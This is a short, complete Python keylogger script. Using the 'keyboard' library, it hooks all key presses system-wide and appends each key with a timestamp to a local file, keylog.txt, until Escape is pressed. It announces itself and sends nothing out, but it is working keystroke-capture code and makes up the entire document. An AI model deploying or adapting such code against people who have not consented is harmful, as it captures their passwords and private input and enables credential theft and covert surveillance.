import keyboard
import sys
import time

def on_key_press(event):
    with open("keylog.txt", "a") as f:
        f.write(f"{event.name} at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    print(f"Key pressed: {event.name}")

    # Exit on Escape key
    if event.name == 'esc':
        print("\nExiting keylogger...")
        sys.exit(0)

def main():
    print("Starting keylogger. Press 'Esc' to stop.")
    print("Press ESC key to exit the keylogger.")
    print("Logging keys to 'keylog.txt'...")            
    keyboard.on_press(on_key_press)

    try:
        # Keep the program running
        keyboard.wait('esc')
        # while True:
        #     time.sleep(1)
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()